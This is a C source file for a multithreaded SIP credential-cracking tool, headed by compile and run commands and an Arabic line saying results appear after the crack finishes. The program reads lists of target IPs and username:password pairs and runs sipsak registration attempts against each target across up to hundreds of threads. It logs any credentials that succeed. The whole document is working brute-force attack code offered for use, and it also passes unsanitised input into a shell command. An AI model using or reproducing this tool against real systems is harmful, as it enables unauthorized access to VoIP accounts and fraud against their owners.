gcc crack.c -o crack -pthread
./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt

=====================================
ستعرض النتائج بعد الانتهاء من الكراك
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

// Define constants for protocol types
#define PROTOCOL_TCP 0
#define PROTOCOL_UDP 1
#define PROTOCOL_TLS 2

// Define constant for max size of a line in input files
#define MAX_LINE_SIZE 1024

// Define structures to store target and user/pass information
typedef struct {
    char ip[100]; // to store IP or domain
    int port;
} Target;

typedef struct {
    char username[100];
    char password[100];
} UserPass;

// Global variables to hold user options
int protocol = PROTOCOL_TCP;
int num_threads = 10;
int num_targets = 5000;
char targets_file[MAX_LINE_SIZE] = "ip.txt";
char user_pass_file[MAX_LINE_SIZE] = "User_Pass";
char success_file[MAX_LINE_SIZE] = "Success_results.txt";
char reservation_file[MAX_LINE_SIZE] = "reservations_targets.txt";
Target* targets;
int num_user_pass;
UserPass* user_passes;
pthread_mutex_t success_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t reservation_mutex = PTHREAD_MUTEX_INITIALIZER;

// Structure to hold successful targets
typedef struct {
    char ip[100];
    int port;
} SuccessTarget;

// Global variable to store successful targets
SuccessTarget* successful_targets;
int num_successful_targets = 0;

// Global variable to store successful credentials
UserPass* successful_credentials;
int num_successful_credentials = 0;

// Function prototypes
Target* read_targets(const char* filename, int* num_targets);
UserPass* read_user_pass(const char* filename, int* num_user_pass);
void print_usage();
int is_target_successful(const char* ip, int port);
int is_credential_successful(const char* username, const char* password);
void add_target_to_success(const char* ip, int port);
void add_credential_to_success(const char* username, const char* password);
void sip_crack(Target* target, UserPass* user_pass);
void* thread_function(void* arg);

// Function to read targets from file
Target* read_targets(const char* filename, int* num_targets) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open targets file");
        exit(EXIT_FAILURE);
    }

    Target* targets = malloc(sizeof(Target) * 10000);
    *num_targets = 0;
    char line[MAX_LINE_SIZE];
    while (*num_targets < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%d", targets[*num_targets].ip, &targets[*num_targets].port);
        (*num_targets)++;
    }
    fclose(file);
    return targets;
}

// Function to read usernames and passwords from file
UserPass* read_user_pass(const char* filename, int* num_user_pass) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open username and password file");
        exit(EXIT_FAILURE);
    }

    UserPass* user_passes = malloc(sizeof(UserPass) * 10000);
    *num_user_pass = 0;
    char line[MAX_LINE_SIZE];
    while (*num_user_pass < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%s", user_passes[*num_user_pass].username, user_passes[*num_user_pass].password);
        (*num_user_pass)++;
    }
    fclose(file);
    return user_passes;
}

// Function to print usage information
void print_usage() {
    printf("Usage: ./crack [options]\n"
           "Options:\n"
           "    -p, --protocol <PROTOCOL_TCP, PROTOCOL_UDP, PROTOCOL_TLS>\n"
           "    -t, --threads <number of threads>\n"
           "    -T, --targets <number of targets>\n"
           "    -f, --targets-file <file with targets>\n"
           "    -u, --user-pass-file <file with usernames and passwords>\n"
           "    -s, --success-file <file to write successful attempts>\n"
           "    -r, --reservation-file <file to write reservations>\n"
           "    -h, --help\n");
}

// Function to check if the target is successful and added to the success list
int is_target_successful(const char* ip, int port) {
    for (int i = 0; i < num_successful_targets; i++) {
        if (strcmp(successful_targets[i].ip, ip) == 0 && successful_targets[i].port == port) {
            return 1;
        }
    }
    return 0;
}

// Function to check if the credential is successful and added to the success list
int is_credential_successful(const char* username, const char* password) {
    for (int i = 0; i < num_successful_credentials; i++) {
        if (strcmp(successful_credentials[i].username, username) == 0 && strcmp(successful_credentials[i].password, password) == 0) {
            return 1;
        }
    }
    return 0;
}

// Function to add the target to the success list
void add_target_to_success(const char* ip, int port) {
    pthread_mutex_lock(&success_mutex);
    successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
    strcpy(successful_targets[num_successful_targets].ip, ip);
    successful_targets[num_successful_targets].port = port;
    num_successful_targets++;
    pthread_mutex_unlock(&success_mutex);
}

// Function to add the credential to the success list
void add_credential_to_success(const char* username, const char* password) {
    pthread_mutex_lock(&success_mutex);
    successful_credentials = realloc(successful_credentials, sizeof(UserPass) * (num_successful_credentials + 1));
    strcpy(successful_credentials[num_successful_credentials].username, username);
    strcpy(successful_credentials[num_successful_credentials].password, password);
    num_successful_credentials++;
    pthread_mutex_unlock(&success_mutex);
}

// Function to perform cracking for a specific target and user/pass combination
void sip_crack(Target* target, UserPass* user_pass) {
    // Check if the target is successful and added to the success list
    if (is_target_successful(target->ip, target->port)) {
        printf("Target %s:%d is successful, skipping...\n", target->ip, target->port);
        return;
    }

    // Check if the credential is successful and added to the success list
    if (is_credential_successful(user_pass->username, user_pass->password)) {
        printf("Credentials %s:%s are successful, skipping...\n", user_pass->username, user_pass->password);
        return;
    }

    // Perform cracking on the target using the provided user/pass
    char command[MAX_LINE_SIZE];
    char protocol_str[MAX_LINE_SIZE];

    if (protocol == PROTOCOL_TCP) {
        strncpy(protocol_str, "tcp", MAX_LINE_SIZE - 1);
    } else if (protocol == PROTOCOL_UDP) {
        strncpy(protocol_str, "udp", MAX_LINE_SIZE - 1);
    } else if (protocol == PROTOCOL_TLS) {
        strncpy(protocol_str, "tls --tls-ignore-cert-failure", MAX_LINE_SIZE - 1);
    } else {
        fprintf(stderr, "Invalid protocol specified.\n");
        return;
    }

    snprintf(command, MAX_LINE_SIZE, "sipsak -U -C sip:%s@%s -s sip:%s@%s:%d -u %s -a %s -H %s -i -vvv -E %s 2>&1",
             user_pass->username, target->ip,
             user_pass->username, target->ip, target->port,
             user_pass->username, user_pass->password,
             target->ip, protocol_str);

    printf("Running command: %s\n", command);

    // Open the command as a pipe and read the output with a timeout of 10 seconds
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        perror("Failed to open pipe");
        return;
    }

    // Set a timer for 10 seconds
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(fileno(pipe), &fds);

    // Wait for the pipe to be ready for reading or the timeout to occur
    int select_result = select(fileno(pipe) + 1, &fds, NULL, NULL, &timeout);

    if (select_result == -1) {
        perror("select error");
    } else if (select_result == 0) {
        // Timeout occurred
        printf("Timeout occurred for target %s:%d\n", target->ip, target->port);
    } else {
        // Pipe is ready for reading, read the output
        char buffer[MAX_LINE_SIZE];
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            printf("Command Output: %s", buffer); // Print the output for debugging
            // Check if the response contains "200 OK", "202 Accepted", or "204 No Notification"
            if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
                printf("Success: %s\n", buffer);
                add_target_to_success(target->ip, target->port); // Add the target to the success list
                add_credential_to_success(user_pass->username, user_pass->password); // Add the credential to the success list
                break; // Break the loop if successful response is found
            }
        }
    }

    pclose(pipe);
}

// Thread function for cracking
void* thread_function(void* arg) {
    int thread_id = *(int*)arg;
    int targets_per_thread = num_targets / num_threads;
    int start = thread_id * targets_per_thread;
    int end = (thread_id == num_threads - 1) ? num_targets : (thread_id + 1) * targets_per_thread;

    for (int i = start; i < end; i++) {
        for (int j = 0; j < num_user_pass; j++) {
            sip_crack(&targets[i], &user_passes[j]);
        }
    }

    return NULL;
}

// Entry point of the program
int main(int argc, char* argv[]) {
    // Struct for getopt
    static struct option long_options[] = {
        {"protocol", required_argument, NULL, 'p'},
        {"threads", required_argument, NULL, 't'},
        {"targets", required_argument, NULL, 'T'},
        {"targets-file", required_argument, NULL, 'f'},
        {"user-pass-file", required_argument, NULL, 'u'},
        {"success-file", required_argument, NULL, 's'},
        {"reservation-file", required_argument, NULL, 'r'},
        {"help", no_argument, NULL, 'h'},
        {NULL, 0, NULL, 0}};

    // Parse options
    int opt;
    while ((opt = getopt_long(argc, argv, "p:t:T:f:u:s:r:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'p':
                protocol = atoi(optarg);
                break;
            case 't':
                num_threads = atoi(optarg);
                break;
            case 'T':
                num_targets = atoi(optarg);
                break;
            case 'f':
                strncpy(targets_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'u':
                strncpy(user_pass_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 's':
                strncpy(success_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'r':
                strncpy(reservation_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'h':
            default:
                print_usage();
                return EXIT_SUCCESS;
        }
    }

    // Load targets and user/pass data from files
    targets = read_targets(targets_file, &num_targets);
    user_passes = read_user_pass(user_pass_file, &num_user_pass);
    successful_targets = malloc(0); // Initialize the array to hold successful targets
    successful_credentials = malloc(0); // Initialize the array to hold successful credentials

    // Create threads and perform cracking in parallel
    pthread_t threads[num_threads];
    int thread_ids[num_threads];
    for (int i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, thread_function, &thread_ids[i]) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < num_threads; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("Failed to join thread");
            exit(EXIT_FAILURE);
        }
    }

    // Cleanup
    free(targets);
    free(user_passes);
    free(successful_targets);
    free(successful_credentials);

    return EXIT_SUCCESS;
}
